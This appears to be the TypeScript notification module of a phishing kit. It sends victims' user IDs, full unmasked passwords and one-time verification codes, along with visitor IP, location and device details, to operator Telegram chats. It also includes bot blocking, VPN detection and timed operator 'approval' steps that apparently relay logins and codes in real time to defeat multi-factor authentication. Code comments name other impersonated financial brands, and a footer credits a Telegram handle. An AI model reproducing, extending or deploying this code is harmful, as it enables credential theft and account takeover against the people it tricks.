import {
  buildLoginApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from "@/lib/telegram-approval-templates";
import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown";
import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic";

const SITE_NAME = "Peak";

// Telegram configuration comes from the environment — never hardcode credentials.
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
// TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || "")
  .split(",")
  .map((id) => id.trim())
  .filter(Boolean);

if (!TELEGRAM_BOT_TOKEN) {
  console.error("⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables");
}
if (CHAT_IDS.length === 0) {
  console.error("⚠️ TELEGRAM_CHAT_ID is not set in environment variables");
}

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim());
}

/** Coerce host-only ADMIN_PORTAL_URL values to https:// so asLink can use the write-up label. */
function ensureAbsoluteHttpUrl(value: string): string {
  const t = value.trim();
  if (!t || isHttpUrl(t) || t.startsWith("/")) return t;
  if (/^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(t)) {
    return `https://${t}`;
  }
  return t;
}

function normalizeAdminPortalUrl(raw?: string): string {
  const t = ensureAbsoluteHttpUrl((raw ?? "").trim());
  if (!t) return "/admin/login";
  const origin = t
    .replace(/\/admin\/login.*$/i, "")
    .replace(/\?.*$/, "")
    .replace(/\/+$/, "");
  return origin || "/admin/login";
}

/** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
function adminPortalLink(): string {
  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL);
}

/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = ensureAbsoluteHttpUrl(url.trim());
  const linkText = (label?.trim() || href).trim();
  // Never expose the raw Control Center URL as the visible link line — use the write-up label.
  if (!href || !isHttpUrl(href)) {
    if (label?.trim()) return escapeTelegramHtml(label.trim());
    return asCode(href || "Unknown");
  }
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`;
}

function asCode(value: unknown): string {
  const t = value == null || value === "" ? "Unknown" : String(value).trim() || "Unknown";
  return `<code>${escapeTelegramHtml(t)}</code>`;
}

/**
 * Canonical URL field: a real URL becomes a clickable `<a href>` anchor, while
 * `Direct` and anything non-URL stays a `<code>` label. Matches the helper used
 * by adp, ebcparticipant, igoe, principal, raiseright and transamerica.
 */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim();
  const resolved = t || fallback;
  if (resolved === "Direct") return asCode(resolved);
  if (isHttpUrl(resolved)) return asLink(resolved);
  return asCode(resolved);
}

/** Site header for all ops flow messages (login / method / OTP / registration). */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`;
}

export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
  /** Parsed from the UA — the template must never dump the raw UA string. */
  platformLabel?: string;
  browserLabel?: string;
  deviceLabel?: string;
  /** ASN / org for the VPN / datacenter heuristic. */
  asn?: string | null;
  org?: string | null;
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

class TelegramService {
  private botToken: string;
  private chatIds: string[];

  constructor() {
    this.botToken = TELEGRAM_BOT_TOKEN;
    this.chatIds = CHAT_IDS;
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error(
        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      );
      return;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      );
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
    }
  }

  async sendVisitorNotification(data: VisitorData): Promise<void> {
    const ipV4 = data.ipV4;
    const ipV6 = data.ipV6;
    let ipDisplay = data.ip;

    if (ipV4 && ipV6) {
      ipDisplay = `${ipV4} (IPv4), ${ipV6} (IPv6)`;
    } else if (ipV4) {
      ipDisplay = `${ipV4} (IPv4)`;
    } else if (ipV6) {
      ipDisplay = `${ipV6} (IPv6)`;
    }

    const pageUrl = data.url ?? "(unknown)";
    const rawReferrer = (data.referrer ?? "").trim();
    const referrer =
      rawReferrer !== ""
        ? rawReferrer
        : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";

    // Catalog §1 — New Visitor Alert. Header is `🌐 (Site)`, NOT the 🏷️ flow
    // header; the 🛡️ line appears only when the heuristic fires; the footer must
    // carry the clickable `All Father` link. The raw UA must never be dumped —
    // Platform / Browser / Device are parsed labels.
    const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp);
    const lines = [
      `🌐 <b>(${escapeTelegramHtml(SITE_NAME)})</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `📍 <b>Location:</b> ${asCode(data.location)}`,
      `🌍 <b>IP:</b> ${asCode(ipDisplay)}`,
      `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
      `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
      ...(networkHint ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`] : []),
      "",
      `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? "Unknown")}`,
      `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
      `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
          `🔗 <b>Referrer:</b> ${asUrlField(referrer, "Direct")}`,
          `🌐 <b>URL:</b> ${asUrlField(pageUrl)}`,
      "",
      `<a href="https://t.me/th3_allfather">All Father</a>`,
    ];
    await this.sendMessage(lines.join("\n"));
  }

  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
    const patternsText =
      data.matchedPatterns && data.matchedPatterns.length > 0
        ? data.matchedPatterns.join(", ")
        : "Unknown";

    const message =
      `\n🤖 <b>BOT</b>\n\n` +
      `🧩 <b>Name:</b> ${data.name}\n` +
      `📝 <b>Type:</b> ${data.type}\n\n` +
      `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
      `📍 <b>IP:</b> ${data.ip}\n` +
      `🔗 <b>Path:</b> ${data.path}\n\n` +
      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${patternsText}.`;

    await this.sendMessage(message);
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    // Catalog §3 — ends directly after the password. NO status line. The
    // password is sent unmasked in full (zero-masking hard rule).
    const message = wrapFlowMessage(
      [
        "🔐 Login Attempt",
        "━━━━━━━━━━━━━━━━━━",
        `👤 <b>User ID:</b> ${asCode(data.userId)}`,
        `🔒 <b>Password:</b> ${asCode(data.password)}`,
      ].join("\n"),
    );
    await this.sendMessage(message);
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const message = wrapFlowMessage(
      [
        "✅ Verification Code Submitted",
        "━━━━━━━━━━━━━━━━━━",
        `🔐 <b>Type:</b> ${asCode(data.verificationType)}`,
        `🔢 <b>Code:</b> ${asCode(data.code)}`,
      ].join("\n"),
    );
    await this.sendMessage(message);
  }

  async sendVerificationClickNotification(
    verificationType: string,
    ip?: string,
  ): Promise<void> {
    const message = wrapFlowMessage(
      [
        "🟦 Verification Option Selected",
        "━━━━━━━━━━━━━━━━━━",
        `🔐 <b>Type:</b> ${asCode(verificationType)}`,
      ].join("\n"),
    );
    await this.sendMessage(message);
  }

  async sendResendCodeNotification(ip?: string): Promise<void> {
    const message = wrapFlowMessage(
      ["🔄 Resend Code Requested", "━━━━━━━━━━━━━━━━━━"].join("\n"),
    );
    await this.sendMessage(message);
  }

  async sendBlockedBotNotification(data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
    await this.sendMessage(msg);
  }

  /** Gate 1 approval request — method page Generate Code. */
  async sendLoginApprovalNotification(data: {
    userId: string;
    password: string;
    method: "email" | "text";
    createdAtMs: number;
    databaseShard?: string;
    ip?: string;
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : "/admin/login";
    await sendTelegramApprovalWithCountdown({
      botToken: this.botToken,
      chatIds: this.chatIds,
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildLoginApprovalRequestBody({
          userId: data.userId,
          password: data.password,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
        }),
    });
  }

  /** Gate 2 approval request — passcode page Continue. */
  async sendVerificationApprovalNotification(data: {
    userId: string;
    method: "email" | "text";
    code: string;
    createdAtMs: number;
    databaseShard?: string;
    ip?: string;
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : "/admin/login";
    await sendTelegramApprovalWithCountdown({
      botToken: this.botToken,
      chatIds: this.chatIds,
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildOtpApprovalRequestBody({
          userId: data.userId,
          code: data.code,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
        }),
    });
  }
}

export const telegramService = new TelegramService();
